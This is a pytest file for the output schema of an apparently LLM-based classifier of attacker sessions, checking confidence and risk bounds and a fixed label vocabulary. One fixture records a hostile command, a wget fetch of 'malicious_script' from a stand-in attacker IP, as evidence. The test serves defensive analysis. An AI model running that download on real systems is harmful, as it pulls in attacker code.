import pytest
from pydantic import ValidationError

from app.services.llm.schemas import ClassificationResult, EvidenceCitation


def test_classification_requires_at_least_one_citation() -> None:
    with pytest.raises(ValidationError):
        ClassificationResult(
            classification="Botnet loader",
            confidence=0.9,
            risk_score=87,
            risk="critical",
            behavior_summary="Downloaded and ran a script.",
            evidence=[],
        )


def test_confidence_outside_zero_to_one_is_rejected() -> None:
    with pytest.raises(ValidationError):
        ClassificationResult(
            classification="Botnet loader",
            confidence=90,
            risk_score=87,
            risk="critical",
            behavior_summary="x",
            evidence=[EvidenceCitation(event_id="e1", artifact="wget x")],
        )


def test_risk_score_outside_zero_to_hundred_is_rejected() -> None:
    with pytest.raises(ValidationError):
        ClassificationResult(
            classification="Botnet loader",
            confidence=0.9,
            risk_score=870,
            risk="critical",
            behavior_summary="x",
            evidence=[EvidenceCitation(event_id="e1", artifact="wget x")],
        )


def test_unknown_risk_level_is_rejected() -> None:
    with pytest.raises(ValidationError):
        ClassificationResult(
            classification="Botnet loader",
            confidence=0.9,
            risk_score=87,
            risk="apocalyptic",
            behavior_summary="x",
            evidence=[EvidenceCitation(event_id="e1", artifact="wget x")],
        )


def test_valid_classification_is_accepted() -> None:
    result = ClassificationResult(
        classification="Botnet loader",
        confidence=0.91,
        risk_score=87,
        risk="critical",
        behavior_summary="Downloaded and executed a remote script.",
        evidence=[
            EvidenceCitation(
                event_id="seed-botnet-01-008",
                artifact="wget http://198.51.100.7/malicious_script",
            )
        ],
    )
    assert result.evidence[0].event_id == "seed-botnet-01-008"


@pytest.mark.parametrize("label", ["Automated botnet dropper", "A" * 5000, ""])
def test_a_label_outside_the_vocabulary_is_rejected(label: str) -> None:
    """Free text gave 22 labels to near-identical sessions, and a label is
    stored, shown, re-rendered into the recommend prompt and indexed as a
    keyword. Off the list it is refused; `_classify_one` degrades that to the
    visible "Unclassified" fallback."""
    with pytest.raises(ValidationError):
        ClassificationResult(
            classification=label,
            confidence=0.5,
            risk_score=10,
            risk="low",
            behavior_summary="ok",
            evidence=[EvidenceCitation(event_id="e-1", artifact="ls")],
        )


def test_the_vocabulary_reaches_the_schema_the_model_is_given() -> None:
    """Ollama is sent this schema as `format`, so the enum is what constrains
    the label during generation rather than after it."""
    from typing import get_args

    from app.services.llm.schemas import Classification

    schema = ClassificationResult.model_json_schema()
    assert set(schema["properties"]["classification"]["enum"]) == set(get_args(Classification))
    assert "Unclassified" in get_args(Classification)  # the analyzer's fallback must be on the list


def test_a_long_behavior_summary_is_still_accepted() -> None:
    """Deliberately unbounded: `_merge_classifications` concatenates one
    summary per chunk, so a per-call bound would be breached by our own
    merge -- a ValidationError in our code, aborting a completed analysis
    rather than degrading it."""
    result = ClassificationResult(
        classification="Botnet loader",
        confidence=0.5,
        risk_score=10,
        risk="low",
        behavior_summary="B" * 20000,
        evidence=[EvidenceCitation(event_id="e-1", artifact="ls")],
    )
    assert len(result.behavior_summary) == 20000
